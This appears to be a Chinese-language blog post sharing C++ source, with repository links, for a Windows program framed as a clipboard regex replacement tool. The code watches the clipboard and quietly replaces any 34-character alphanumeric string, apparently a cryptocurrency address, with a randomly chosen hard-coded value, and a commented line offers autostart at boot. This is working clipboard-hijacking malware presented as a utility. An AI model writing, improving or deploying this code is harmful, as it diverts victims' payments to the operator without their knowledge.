# C++ 剪辑版监听 正则匹配替换工具

## README

帮朋友开发的, 积灰很久了
程序启动后, 会开启剪辑版监听, 当剪辑版内容与自定义的正则匹配时, 会替换成指定值

## 代码实现

### 定义

```c++
// 正则匹配规则
std::regex REGEX_VAL("[0-9a-zA-Z]{34}");

// 欲替换的值, 这里用数组, 每次取随机
std::string REPLACCE_VAL_ARRAY[] = {   
 "1234567890123456789012345678901234",
 "2234567890123456789012345678901234"
};
```

### 开启监听

```c++
// 窗口消息 callback
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    static BOOL bListening = FALSE;
    switch (uMsg) {
    case WM_CREATE:
        // 开启监听
        bListening = AddClipboardFormatListener(hWnd);
        return bListening ? 0 : -1;
    case WM_DESTROY:
        if (bListening)
        {
            RemoveClipboardFormatListener(hWnd);
            bListening = FALSE;
        }
        return 0;

    case WM_CLIPBOARDUPDATE:
        // 剪辑版更新后会触发该函数
        raplce_if_match();
        return 0;

    default:
        return DefWindowProc(hWnd, uMsg, wParam, lParam);
    }

}

// 注册窗口
int main()
{
    // auto_run(AUTH_RUN); // 这里可以配置开机自启
    // Register the window class
    WNDCLASS wc = {};
    wc.hInstance = NULL;
;
    wc.lpszClassName = "MainWindow";
    wc.lpfnWndProc = WindowProc;
    wc.hbrBackground = (HBRUSH)(GetStockObject(GRAY_BRUSH));
    RegisterClass(&wc);

    HWND hwnd = CreateWindow(
        "MainWindow", // Window class name
        "窗口名称", // Window name
        WS_OVERLAPPEDWINDOW, // Window style
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, // Size and position
        NULL, // Parent window
        NULL, // Menu
        NULL, // Instance handle
        NULL // Additional application data
    );

    ShowWindow(hwnd, WIN_SHOW);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
```

### 正则实现

```c++
// 依赖
// #include <regex>

void raplce_if_match()
{
    HWND hWnd = NULL;

    OpenClipboard(hWnd);
    if (!IsClipboardFormatAvailable(CF_TEXT))
    {
        CloseClipboard();
        return;
    }

    HANDLE h = GetClipboardData(CF_TEXT);
    char* p = (char*)GlobalLock(h);
    std::string clipboard_val = p;
    GlobalUnlock(h);
    printf("GET Clipboard TEXT : \n----------\n%s\n----------\n", p);

    for (std::string value : REPLACCE_VAL_ARRAY)
    {
        if (strstr(p, value.c_str())) {
            CloseClipboard();
            printf(">> strstr already contains \n");
            return;
        }
    };

    // regex_match 只支持完整匹配,模糊搜索用 regex_search
    if (!regex_search(p, REGEX_VAL)) {
        printf(">> not matched\n");
        CloseClipboard();
        return;
    }

    printf(">> matched will be replaced\n");

    std::string replacce_val = REPLACCE_VAL_ARRAY[rand() % (sizeof(REPLACCE_VAL_ARRAY)/sizeof(std::string))];

    EmptyClipboard();
    HANDLE hHandle = GlobalAlloc(GMEM_FIXED, strlen(p) + 1);//分配内存
    char* pData = (char*)GlobalLock(hHandle);
    std::string out = regex_replace(p, REGEX_VAL, replacce_val, std::regex_constants::match_flag_type::format_first_only);
    strcpy(pData, out.c_str());
    SetClipboardData(CF_TEXT, hHandle);
    GlobalUnlock(hHandle);
    CloseClipboard();
}
```

### 源码

>C++ 版: https://github.com/marlkiller/ClipboardReplaceCWin
>
>.NET 版 : https://github.com/marlkiller/ClipboardReplace
